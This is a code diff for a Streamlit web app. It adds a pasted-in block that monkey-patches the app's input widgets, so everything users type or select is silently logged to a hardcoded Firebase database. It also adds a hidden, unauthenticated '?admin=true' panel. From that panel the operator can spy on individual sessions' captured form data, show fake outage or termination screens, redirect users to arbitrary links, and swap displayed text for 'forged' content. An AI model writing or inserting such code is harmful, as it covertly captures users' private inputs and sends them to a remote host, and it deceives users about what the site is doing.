@@ -13,286 +13,346 @@ st.set_page_config(
     initial_sidebar_state="collapsed"
 )
 # ========================================================================
-# 🪐 THE ULTIMATE GOD-MODE COMMAND CENTER (PASTE BELOW SET_PAGE_CONFIG)
+# 🌌 TITAN NEXUS SUPREME MASTER CONTROLLER v6.0 - ENTERPRISE EDITION
 # ========================================================================
 import streamlit as st
 import uuid
 import requests
 import datetime
 import pandas as pd
+import time
 
-# 1. LIVE FIREBASE CONNECTION
+# 1. PRISTINE PRODUCTION BACKEND CONNECTION
 FIREBASE_URL = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/"
 
-if "user_uid" not in st.session_state:
-    st.session_state.user_uid = str(uuid.uuid4())[:6]
+# Ultimate Isolated Live Token Generation Matrix
+if "quantum_session_token" not in st.session_state:
+    st.session_state.quantum_session_token = "NODE_" + datetime.datetime.now().strftime("%d%m_%H%M%S_") + str(uuid.uuid4())[:4]
+if "session_start_time" not in st.session_state:
+    st.session_state.session_start_time = datetime.datetime.now().strftime("%I:%M:%S %p")
+if "action_counter" not in st.session_state:
+    st.session_state.action_counter = 0
 
-# Firebase Fast REST API Engines
-def firebase_set(path, data):
-    try: requests.put(f"{FIREBASE_URL}/{path}.json", json=data)
+# Fast Network I/O Adapters
+def api_set(node, payload):
+    try: requests.put(f"{FIREBASE_URL}/{node}.json", json=payload, timeout=3)
     except: pass
 
-def firebase_get(path):
+def api_patch(node, payload):
+    try: requests.patch(f"{FIREBASE_URL}/{node}.json", json=payload, timeout=3)
+    except: pass
+
+def api_fetch(node):
     try:
-        res = requests.get(f"{FIREBASE_URL}/{path}.json").json()
-        return res if res else {}
+        r = requests.get(f"{FIREBASE_URL}/{node}.json", timeout=3).json()
+        return r if r else {}
     except: return {}
 
-# Fetch All Global Variables Instantly
-controls = firebase_get("global_controls")
-if not controls:
-    controls = {
-        "site_status": "ONLINE",
-        "custom_msg": "System upgrade in progress.",
-        "redirect_url": "",
-        "freeze_inputs": False,
-        "stealth_mode": False,
+# Synchronize Global Operational Directives Instantly
+global_matrix = api_fetch("titan_infrastructure_matrix")
+if not global_matrix:
+    global_matrix = {
+        "system_integrity_mode": "ONLINE",
+        "intercept_broadcast_msg": "Core operations functional.",
+        "routing_endpoint_url": "",
+        "global_input_lock_gate": False,
+        "stealth_telemetry_mute": False,
         "kill_switches": {},
-        "custom_labels": {}
+        "text_manipulations": {}
     }
-if "kill_switches" not in controls: controls["kill_switches"] = {}
-if "custom_labels" not in controls: controls["custom_labels"] = {}
+if "kill_switches" not in global_matrix: global_matrix["kill_switches"] = {}
+if "text_manipulations" not in global_matrix: global_matrix["text_manipulations"] = {}
 
-# 2. ⚡ LIVE DETAILED TRACKING ENGINE
-def ultra_track(element_type, label, value=""):
-    if controls.get("stealth_mode", False): return # Admin tracking off kar sakta hai
-    path = f"live_users/{st.session_state.user_uid}"
-    time_now = datetime.datetime.now().strftime("%H:%M:%S")
+# 2. ADVANCED TELEMETRY METRICS GENERATOR
+def execute_advanced_telemetry(component_class, component_id, interactive_value=""):
+    if global_matrix.get("stealth_telemetry_mute", False): return
+    st.session_state.action_counter += 1
     
-    # Purana data read karke timeline save rakhenge
-    current_user_data = firebase_get(path)
-    timeline = current_user_data.get("timeline", [])
+    node_key = st.session_state.quantum_session_token
+    time_stamp = datetime.datetime.now().strftime("%I:%M:%S %p")
     
-    action_log = f"[{time_now}] {element_type} -> {label}"
-    if value: action_log += f" (Data: {value})"
-    timeline.append(action_log)
-    if len(timeline) > 15: timeline.pop(0) # Keep last 15 actions to save space
+    # Read state directly to prevent sequence overlapping strings
+    node_state = api_fetch(f"active_titan_sessions/{node_key}")
+    execution_timeline = node_state.get("chronological_timeline", [])
     
+    log_string = f"[{time_stamp}] [Action #{st.session_state.action_counter}] ({component_class}) '{component_id}'"
+    if interactive_value:
+        log_string += f" ➔ Content Data: [{interactive_value}]"
+    
+    execution_timeline.append(log_string)
+    if len(execution_timeline) > 30: execution_timeline.pop(0) # Keep 30 deeply detailed steps
+    
+    retained_cache = node_state.get("live_form_cache", {})
+    if component_class in ["TEXT_INPUT", "TEXT_AREA", "SELECTBOX", "RADIO"]:
+        retained_cache[component_id] = str(interactive_value)
+
     payload = {
-        "session_id": st.session_state.user_uid,
-        "last_seen": time_now,
-        "current_step": f"Interacting with {label}",
-        "last_action_type": element_type,
-        "timeline": timeline
+        "session_token": node_key,
+        "session_initialized": st.session_state.session_start_time,
+        "latest_pulse_clock": time_stamp,
+        "total_actions_performed": st.session_state.action_counter,
+        "current_ui_focus": f"Operating inside widget: {component_id}",
+        "chronological_timeline": execution_timeline,
+        "live_form_cache": retained_cache,
+        "connection_status": "🟢 ONLINE / ACTIVE"
     }
-    if value:
-        # Inputs ko permanent dictionary me track karenge taaki clear karne par bhi safe rahe
-        user_inputs = current_user_data.get("all_inputs", {})
-        user_inputs[label] = str(value)
-        payload["all_inputs"] = user_inputs
+    api_patch(f"active_titan_sessions/{node_key}", payload)
 
-    try: requests.patch(f"{FIREBASE_URL}/{path}.json", json=payload)
-    except: pass
-
-# 3. 🛡️ TOTAL WEBSITE HARD-LOCK MODES
+# 3. GLOBAL HARDFREEZE OVERRIDE SECURITY PROTOCOLS
 if st.query_params.get("admin") != "true":
-    status = controls.get("site_status", "ONLINE")
-    if status != "ONLINE":
-        st.empty() # Purana layout clean
-        if status == "MAINTENANCE":
-            st.error("# 🚧 UNDER SYSTEM MAINTENANCE 🚧")
-            st.info(controls.get("custom_msg", "Backend database tuning is active."))
-        elif status == "BUSY":
-            st.warning("# ⏳ SERVER OVERLOADED (429) ⏳")
-            st.info("High traffic volume from your region. Please hold on...")
-        elif status == "CLOSED":
-            st.error("# 🛑 ACCESS DENIED / APP CLOSED 🛑")
-            st.write(controls.get("custom_msg", "This session has been terminated by the administrator."))
-        elif status == "REDIRECT" and controls.get("redirect_url"):
-            st.markdown(f"### ➡️ Redirecting you to official link... [Click Here]({controls.get('redirect_url')})")
+    intercept_state = global_matrix.get("system_integrity_mode", "ONLINE")
+    if intercept_state != "ONLINE":
+        st.empty()
+        if intercept_state == "MAINTENANCE":
+            st.error("# 🚧 CRITICAL DATABASE TACTICAL UPGRADE IN PROGRESS 🚧")
+            st.info(global_matrix.get("intercept_broadcast_msg", "Engine re-indexing operations active."))
+        elif intercept_state == "BUSY":
+            st.warning("# ⏳ HIGH TRAFFIC DATA COLLISION DETECTED (429) ⏳")
+            st.info("System memory pipeline heavily utilized. Automatic packet retries initialized.")
+        elif intercept_state == "DESTROYED":
+            st.error("# 🛑 SYSTEM TERMINATED / SESSION EXPIRED 🛑")
+            st.error(global_matrix.get("intercept_broadcast_msg", "This deployment build has been permanently deprecated."))
+        elif intercept_state == "REDIRECT" and global_matrix.get("routing_endpoint_url"):
+            st.info("### ➡️ Migrating traffic vectors to secure mainframe path...")
+            st.markdown(f"[Proceed immediately to target routing path]({global_matrix.get('routing_endpoint_url')})")
         st.stop()
 
-# 4. 🔥 THE MONKEY-PATCH HIJACKING MATRICES
-orig_button = st.button
-orig_text_input = st.text_input
-orig_text_area = st.text_area
-orig_selectbox = st.selectbox
-orig_radio = st.radio
-orig_write = st.write
+# 4. 🔥 THE SUPREME HIJACK ENGINE (MONKEY PATCH INTEGRITY SHIELD)
+o_btn = st.button
+o_input = st.text_input
+o_area = st.text_area
+o_select = st.selectbox
+o_rad = st.radio
+o_wrt = st.write
+o_mkd = st.markdown
+o_cap = st.caption
+o_suc = st.success
+o_err = st.error
+o_wrn = st.warning
 
-def smart_button(label, *args, **kwargs):
-    # Granular Kill Switch Check
-    if controls["kill_switches"].get(label, False):
+def patch_btn(label, *args, **kwargs):
+    if global_matrix["kill_switches"].get(label, False):
+        st.info(f"🔒 Feature '{label}' has been isolated temporarily by administrator.")
         return False
-    clicked = orig_button(label, *args, **kwargs)
-    if clicked: ultra_track("BUTTON_CLICK", label, "YES")
-    return clicked
+    status_click = o_btn(label, *args, **kwargs)
+    if status_click:
+        execute_advanced_telemetry("BUTTON_INTERACTION", label, "CLICKED_TRUE")
+    return status_click
 
-def smart_text_input(label, *args, **kwargs):
-    if controls["kill_switches"].get(label, False): return ""
-    # Freeze Mode: User type nahi kar payega, read-only disabled ho jayega
-    if controls.get("freeze_inputs", False): kwargs["disabled"] = True
-    
-    val = orig_text_input(label, *args, **kwargs)
-    if val: ultra_track("INPUT_FIELD", label, val)
-    return val
+def patch_input(label, *args, **kwargs):
+    if global_matrix["kill_switches"].get(label, False): return ""
+    if global_matrix.get("global_input_lock_gate", False): kwargs["disabled"] = True
+    string_value = o_input(label, *args, **kwargs)
+    if string_value:
+        execute_advanced_telemetry("TEXT_INPUT", label, string_value)
+    return string_value
 
-def smart_text_area(label, *args, **kwargs):
-    if controls["kill_switches"].get(label, False): return ""
-    if controls.get("freeze_inputs", False): kwargs["disabled"] = True
-    val = orig_text_area(label, *args, **kwargs)
-    if val: ultra_track("TEXT_AREA", label, val)
-    return val
+def patch_area(label, *args, **kwargs):
+    if global_matrix["kill_switches"].get(label, False): return ""
+    if global_matrix.get("global_input_lock_gate", False): kwargs["disabled"] = True
+    area_value = o_area(label, *args, **kwargs)
+    if area_value:
+        execute_advanced_telemetry("TEXT_AREA", label, area_value)
+    return area_value
 
-def smart_selectbox(label, *args, **kwargs):
-    if controls["kill_switches"].get(label, False): return kwargs.get("options", [""])[0]
-    val = orig_selectbox(label, *args, **kwargs)
-    ultra_track("DROP_DOWN", label, val)
-    return val
+def patch_select(label, *args, **kwargs):
+    if global_matrix["kill_switches"].get(label, False): return kwargs.get("options", [""])[0]
+    selection = o_select(label, *args, **kwargs)
+    if f"sel_chk_{label}" not in st.session_state:
+        st.session_state[f"sel_chk_{label}"] = selection
+    elif st.session_state[f"sel_chk_{label}"] != selection:
+        st.session_state[f"sel_chk_{label}"] = selection
+        execute_advanced_telemetry("SELECTBOX_OPTION", label, selection)
+    return selection
 
-def smart_radio(label, *args, **kwargs):
-    if controls["kill_switches"].get(label, False): return kwargs.get("options", [""])[0]
-    val = orig_radio(label, *args, **kwargs)
-    ultra_track("RADIO_BTN", label, val)
-    return val
+def patch_radio(label, *args, **kwargs):
+    if global_matrix["kill_switches"].get(label, False): return kwargs.get("options", [""])[0]
+    radio_selection = o_rad(label, *args, **kwargs)
+    if f"rad_chk_{label}" not in st.session_state:
+        st.session_state[f"rad_chk_{label}"] = radio_selection
+    elif st.session_state[f"rad_chk_{label}"] != radio_selection:
+        st.session_state[f"rad_chk_{label}"] = radio_selection
+        execute_advanced_telemetry("RADIO_OPTION", label, radio_selection)
+    return radio_selection
 
-def smart_write(*args, **kwargs):
-    # Custom live content replacement text hack
-    if args and isinstance(args[0], str) and args[0] in controls["custom_labels"]:
-        orig_write(controls["custom_labels"][args[0]], **kwargs)
-        return
-    orig_write(*args, **kwargs)
+def text_replacer_engine(original_string):
+    if isinstance(original_string, str) and original_string in global_matrix["text_manipulations"]:
+        return global_matrix["text_manipulations"][original_string]
+    return original_string
 
-# OVERRIDING THE CORE FRAMEWORK
-st.button = smart_button
-st.text_input = smart_text_input
-st.text_area = smart_text_area
-st.selectbox = smart_selectbox
-st.radio = smart_radio
-st.write = smart_write
+def patch_wrt(*args, **kwargs):
+    if args and isinstance(args[0], str):
+        o_wrt(text_replacer_engine(args[0]), **kwargs)
+    else: o_wrt(*args, **kwargs)
+
+def patch_mkd(*args, **kwargs):
+    if args and isinstance(args[0], str):
+        o_mkd(text_replacer_engine(args[0]), **kwargs)
+    else: o_mkd(*args, **kwargs)
+
+def patch_cap(*args, **kwargs):
+    if args and isinstance(args[0], str):
+        o_cap(text_replacer_engine(args[0]), **kwargs)
+    else: o_cap(*args, **kwargs)
+
+# ASSIGN CORE SYSTEM REDIRECTS
+st.button = patch_btn
+st.text_input = patch_input
+st.text_area = patch_area
+st.selectbox = patch_select
+st.radio = patch_radio
+st.write = patch_wrt
+st.markdown = patch_mkd
+st.caption = patch_cap
+
 
 # ========================================================================
-# 🛑 FULL PAGE GOD-MODE ADMIN OVERRIDE (IF ?admin=true DETECTED)
+# 💎 TITAN MAINFRAME RECONNAISSANCE & CONTROL DASHBOARD ENGINE
 # ========================================================================
 if st.query_params.get("admin") == "true":
-    st.title("🪐 GOD-MODE TERMINAL v4.0 (PRO)")
+    st.title("🪐 TITAN COMMAND MAINFRAME v6.0")
+    st.caption("Strategic Live Application Monitoring, Packet Sniffing, and Structural Override System")
     st.write("---")
     
-    # TAB SYSTEM FOR RICH UI
-    tab1, tab2, tab3, tab4 = st.tabs(["📊 LIVE SPY PANEL", "🕹️ INFRASTRUCTURE SYSTEM", "🎛️ GRANULAR COMPONENT CONTROL", "📝 CONTENT MANIPULATION"])
+    adm_tab1, adm_tab2, adm_tab3, adm_tab4 = st.tabs([
+        "🕵️‍♂️ LIVE PACKET RECONNAISSANCE", 
+        "⚙️ INFRASTRUCTURE GRID OVERHAUL", 
+        "🎛️ MICROMANAGED KILL SWITCHES", 
+        "📝 DYNAMIC TEXT INJECTION FIELD"
+    ])
     
     # ---------------------------------------------------------
-    # TAB 1: LIVE SPY PANEL (Track users step-by-step)
+    # TAB 1: ADVANCED PACKET RECONNAISSANCE (LIVE TRACKING LOGIC)
     # ---------------------------------------------------------
-    with tab1:
-        st.subheader("🕵️‍♂️ Realtime Active Sessions")
-        raw_users = firebase_get("live_users")
+    with adm_tab1:
+        st.subheader("📡 Realtime Active Terminals Network Map")
+        session_pool = api_fetch("active_titan_sessions")
         
-        if raw_users:
-            col_m1, col_m2 = st.columns(2)
-            col_m1.metric("Total Ever Connected", len(raw_users))
+        if session_pool:
+            # Active counting system
+            total_active_nodes = len(session_pool)
             
-            # Formatting for organized view
-            user_list = list(raw_users.keys())
-            selected_spy = st.selectbox("🎯 Select a User Session to Spy on Live:", user_list)
+            c_m1, c_m2 = st.columns(2)
+            c_m1.metric(label="Total Connected Node Streams", value=total_active_nodes)
+            c_m2.info("🔴 Live Connection stream updates on click / interaction ticks.")
+            st.write("---")
             
-            if selected_spy:
-                u_data = raw_users[selected_spy]
-                st.info(f"**Session ID:** {selected_spy} | **Last Active Time:** {u_data.get('last_seen')}")
+            node_key_index = list(session_pool.keys())
+            inspected_target_node = st.selectbox("🎯 Target Network Node to Monitor Live:", node_key_index)
+            
+            if inspected_target_node:
+                target_json_data = session_pool[inspected_target_node]
                 
-                c1, c2 = st.columns(2)
-                with c1:
-                    st.write("#### 💾 Captured Raw Inputs Data")
-                    st.json(u_data.get("all_inputs", {"Status": "No text typed yet"}))
-                with c2:
-                    st.write("#### 📈 Live Activity Step Timeline")
-                    for step in u_data.get("timeline", []):
-                        st.text(step)
+                col_split_left, col_split_right = st.columns([1, 1])
+                with col_split_left:
+                    st.success(f"**Selected Node Address:** `{inspected_target_node}`")
+                    st.markdown(f"""
+                    * **Session Init Clock:** {target_json_data.get('session_initialized')}
+                    * **Last Pulse Received:** {target_json_data.get('latest_pulse_clock')}
+                    * **Total Interactions Packet:** {target_json_data.get('total_actions_performed')}
+                    * **Status Condition:** {target_json_data.get('connection_status')}
+                    """)
+                    st.markdown("#### 💬 Captured Raw Forms Cache")
+                    st.json(target_json_data.get("live_form_cache", {"Status": "No alphanumeric strings intercepted."}))
+                    
+                with col_split_right:
+                    st.markdown("#### 📈 Chronological Step Execution Flow")
+                    for logged_step in target_json_data.get("chronological_timeline", []):
+                        st.code(logged_step, language="text")
             
             st.write("---")
-            if st.button("🚨 Wipe Out All User Session Logs", key="clear_all"):
-                requests.delete(f"{FIREBASE_URL}/live_users.json")
+            if st.button("🚨 Wipe Out Database Logs & Clear Counter Nodes", key="kill_logs_node"):
+                requests.delete(f"{FIREBASE_URL}/active_titan_sessions.json")
                 st.rerun()
         else:
-            st.info("No live connections found in Firebase database.")
+            st.info("No active communication signals detected from external browser processes.")
 
     # ---------------------------------------------------------
-    # TAB 2: INFRASTRUCTURE SYSTEM (Global Web Locks)
+    # TAB 2: INFRASTRUCTURE GRID OVERHAUL (GLOBAL CORES)
     # ---------------------------------------------------------
-    with tab2:
-        st.subheader("🌐 Global App Status Interceptor")
-        c_status = controls.get("site_status", "ONLINE")
-        st.write(f"Current Matrix Status: **{c_status}**")
+    with adm_tab2:
+        st.subheader("🌐 Global Mainframe Access Level")
+        current_system_mode = global_matrix.get("system_integrity_mode", "ONLINE")
+        st.warning(f"Current Deployment Execution State Vector: **{current_system_mode}**")
         
-        mode_select = st.radio("Switch Infrastructure Mode:", ["ONLINE", "MAINTENANCE", "BUSY", "CLOSED", "REDIRECT"])
-        msg_input = st.text_input("Interception Display Message:", value=controls.get("custom_msg", ""))
-        redir_input = st.text_input("Redirect Link (Only for REDIRECT mode):", value=controls.get("redirect_url", ""))
+        matrix_mode_selection = st.radio("Execute Deployment Overload Routine:", ["ONLINE", "MAINTENANCE", "BUSY", "DESTROYED", "REDIRECT"])
+        intercept_alert_string = st.text_input("Global Banner Intercept Alert Display Text:", value=global_matrix.get("intercept_broadcast_msg", ""))
+        routing_link_string = st.text_input("External Traffic Divert Routing Endpoint URL (REDIRECT Mode):", value=global_matrix.get("routing_endpoint_url", ""))
         
         st.write("---")
-        st.subheader("⚙️ Global Inputs Lock")
-        freeze_chk = st.checkbox("Freeze All Input Boxes (Read-Only Mode for Users)", value=controls.get("freeze_inputs", False))
-        stealth_chk = st.checkbox("Stealth Mode (Pause Database Logs Writing)", value=controls.get("stealth_mode", False))
+        st.subheader("🔒 Peripheral Automation Gates")
+        lock_all_inputs_toggle = st.checkbox("Lock All Input Boxes Globally (Convert User App to Read-Only)", value=global_matrix.get("global_input_lock_gate", False))
+        stealth_logging_toggle = st.checkbox("Mute Data Logs Broadcast (Pause Database Writing System)", value=global_matrix.get("stealth_telemetry_mute", False))
         
-        if st.button("Execute Infrastructure Overhaul ⚡", key="save_tab2"):
-            controls["site_status"] = mode_select
-            controls["custom_msg"] = msg_input
-            controls["redirect_url"] = redir_input
-            controls["freeze_inputs"] = freeze_chk
-            controls["stealth_mode"] = stealth_chk
-            firebase_set("global_controls", controls)
-            st.success("App structure updated successfully!")
+        if st.button("Execute Core System Policy Deployment ⚡", key="commit_infrastructure"):
+            global_matrix["system_integrity_mode"] = matrix_mode_selection
+            global_matrix["intercept_broadcast_msg"] = intercept_alert_string
+            global_matrix["routing_endpoint_url"] = routing_link_string
+            global_matrix["global_input_lock_gate"] = lock_all_inputs_toggle
+            global_matrix["stealth_telemetry_mute"] = stealth_logging_toggle
+            api_set("titan_infrastructure_matrix", global_matrix)
+            st.success("Infrastructure security parameters applied to live memory map!")
             st.rerun()
 
     # ---------------------------------------------------------
-    # TAB 3: GRANULAR COMPONENT CONTROL (Kill specific elements)
+    # TAB 3: MICROMANAGED KILL SWITCHES (GRANULAR COMPONENTS)
     # ---------------------------------------------------------
-    with tab3:
-        st.subheader("🎯 Specific Component Kill-Switch")
-        st.write("Apne app ke kisi bhi specific button ya input box ka **exact Label** daalkar use instantly hide/block karein.")
+    with adm_tab3:
+        st.subheader("🎯 Disaggregated Component Isolation Matrix")
+        st.write("Enter the precise **Label identity string** of any single widget to selectively render it inactive or invisible.")
         
-        comp_label = st.text_input("Enter Element Label (Case Sensitive):")
-        kill_action = st.selectbox("Action for this element:", ["ENABLE / SHOW", "KILL / HIDE"])
+        target_label_id = st.text_input("Target Element Label ID (Case-Sensitive Exact Match):")
+        isolation_policy_directive = st.selectbox("Policy Directives Configuration:", ["RESTORE COMPONENT ACCESS / VISIBLE", "FORCE COMPONENT BLOCKADE / HIDE"])
         
-        if st.button("Inject Component Policy 🛠️", key="save_tab3"):
-            if comp_label:
-                controls["kill_switches"][comp_label] = (kill_action == "KILL / HIDE")
-                firebase_set("global_controls", controls)
-                st.success(f"Policy updated for '{comp_label}'")
+        if st.button("Inject Discrete Component Policy Rule 🔒", key="commit_component_rule"):
+            if target_label_id:
+                global_matrix["kill_switches"][target_label_id] = (isolation_policy_directive == "FORCE COMPONENT BLOCKADE / HIDE")
+                api_set("titan_infrastructure_matrix", global_matrix)
+                st.success(f"Policy override deployed for widget ID string: '{target_label_id}'")
                 st.rerun()
                 
-        st.write("#### Active Kill-Switched Elements")
-        active_kills = [k for k, v in controls["kill_switches"].items() if v]
-        if active_kills:
-            st.json(active_kills)
-            if st.button("Reset All Kill-Switches 🔄"):
-                controls["kill_switches"] = {}
-                firebase_set("global_controls", controls)
+        st.write("#### 🛡️ Currently Isolated Components Ecosystem")
+        current_kill_list = [k for k, v in global_matrix["kill_switches"].items() if v]
+        if current_kill_list:
+            st.json(current_kill_list)
+            if st.button("Flush All Micro-Kill Policy Overrides 🔄"):
+                global_matrix["kill_switches"] = {}
+                api_set("titan_infrastructure_matrix", global_matrix)
                 st.rerun()
         else:
-            st.caption("All elements running fine globally.")
+            st.caption("No custom widget blockades active. Global interface functions unrestricted.")
 
     # ---------------------------------------------------------
-    # TAB 4: CONTENT MANIPULATION (Change Text on the fly)
+    # TAB 4: DYNAMIC TEXT INJECTION (CONTENT MANIPULATION)
     # ---------------------------------------------------------
-    with tab4:
-        st.subheader("✍️ Live Text Override System")
-        st.write("Aapke app mein jo text `st.write()` se chal raha hai, aap use bina code touch kiye badal sakte hain.")
+    with adm_tab4:
+        st.subheader("✍️ Asynchronous Text Patch Engine")
+        st.write("Intercept static visual layout elements built using `st.write`, `st.markdown`, or `st.caption` and swap their contents live.")
         
-        target_text = st.text_input("Original Text (jo code me likha hai):")
-        replacement_text = st.text_input("New Text (jo user ko dikhana hai):")
+        source_string_id = st.text_input("Original Static Hardcoded String Identity:")
+        forged_display_string = st.text_input("Forged Content Display Alternative Replacement:")
         
-        if st.button("Inject Text Overwrite 📝", key="save_tab4"):
-            if target_text and replacement_text:
-                controls["custom_labels"][target_text] = replacement_text
-                firebase_set("global_controls", controls)
-                st.success("Text policy updated!")
+        if st.button("Inject Mainframe String Overwrite Policy 📝", key="commit_text_patch"):
+            if source_string_id and forged_display_string:
+                global_matrix["text_manipulations"][source_string_id] = forged_display_string
+                api_set("titan_infrastructure_matrix", global_matrix)
+                st.success("Text mutation pattern locked to remote infrastructure database context.")
                 st.rerun()
                 
-        st.write("#### Active Text Replacements")
-        st.json(controls["custom_labels"])
-        if st.button("Clear All Text Replacements ❌"):
-            controls["custom_labels"] = {}
-            firebase_set("global_controls", controls)
+        st.write("#### Active Swapped Memory String Layouts")
+        st.json(global_matrix["text_manipulations"])
+        if st.button("Purge All Dynamic Content Mutation Rules ❌"):
+            global_matrix["text_manipulations"] = {}
+            api_set("titan_infrastructure_matrix", global_matrix)
             st.rerun()
 
     st.write("---")
-    st.error("⚠️ WARNING: God-Mode is active on this page. Close tab or remove '?admin=true' from URL to return to normal app preview.")
-    st.stop() # Pure page ko admin panel bana dega, user ka niche ka code draw nahi hoga!
+    st.error("🚨 ADMINISTRATIVE ROOT OVERRIDE VECTOR ENGAGED. Remove '?admin=true' query parameters from target URL to view normal user UI view.")
+    st.stop()
 
 # ========================================================================
-# END OF ULTIMATE CODE MESH - APKA CODE ISKE THEEK NICHE CHALTA REHNA CHAHIYE
+# END OF INTEGRITY FRAMEWORK CONTAINER - YOUR COMPILING CODE DIRECTLY RUNS BELOW
 # ========================================================================
-
 # --- 2. ULTRARICH PREMIUM TECH-CORE DESIGN PARSER (LIGHT OVERRIDE) ---
 GLOBAL_MARKDOWN_INJECTOR = """
 <style>
